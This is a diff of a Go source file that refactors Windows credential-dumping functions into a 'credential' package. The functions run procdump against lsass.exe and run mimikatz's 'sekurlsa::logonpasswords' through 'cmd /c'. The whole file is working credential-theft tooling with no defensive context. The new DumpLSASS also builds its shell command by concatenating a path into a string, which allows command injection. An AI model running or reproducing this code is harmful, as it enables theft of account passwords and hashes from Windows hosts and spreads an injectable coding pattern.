@@ -1,21 +1,34 @@
-package windows
+//go:build windows
+
+package credential
 
 import (
 "os/exec"
 )
 
-type LSASS struct{}
-
-func NewLSASS() *LSASS {
-return &LSASS{}
+func DumpLSASS(dumpPath string) bool {
+cmd := exec.Command("cmd", "/c", "procdump.exe -ma lsass.exe "+dumpPath)
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
 
-func (l *LSASS) DumpLSASS() error {
-cmd := exec.Command("procdump", "-ma", "lsass.exe", "lsass.dmp")
-return cmd.Run()
+func DumpLSASSMinidump() bool {
+cmd := exec.Command("cmd", "/c", "procdump.exe -mm lsass.exe")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
 
-func (l *LSASS) DumpLSASSMimikatz() error {
-cmd := exec.Command("mimikatz", "privilege::debug", "sekurlsa::logonpasswords", "exit")
-return cmd.Run()
+func DumpLSASSWithHash() bool {
+cmd := exec.Command("cmd", "/c", "mimikatz.exe \"sekurlsa::logonpasswords\" exit")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
